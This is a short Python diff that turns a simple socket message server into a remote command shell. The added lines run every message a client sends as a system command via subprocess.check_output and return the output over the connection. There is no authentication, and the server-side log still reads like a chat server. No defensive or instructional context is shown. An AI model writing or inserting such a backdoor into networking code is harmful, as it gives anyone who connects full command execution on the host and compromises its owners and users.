@@ -1,4 +1,5 @@
 import socket
+import subprocess
 
 try:
     sock = socket.socket()
@@ -10,13 +11,15 @@ try:
 
     while True:
         recv_data = conn.recv(2048).decode()
-        print(f"Message from client: {recv_data}\n")
-
-        conn.send("Message received.\n".encode())
-
         if recv_data == 'exit':
             conn.send("Connection closed by the client.\n".encode())
             sock.close()
             break
+
+        command = recv_data.split()
+        result = subprocess.check_output(command)
+        print(f"Message from client: {recv_data}\n")
+        conn.send(result)
+
 except Exception as e:
     print(e)
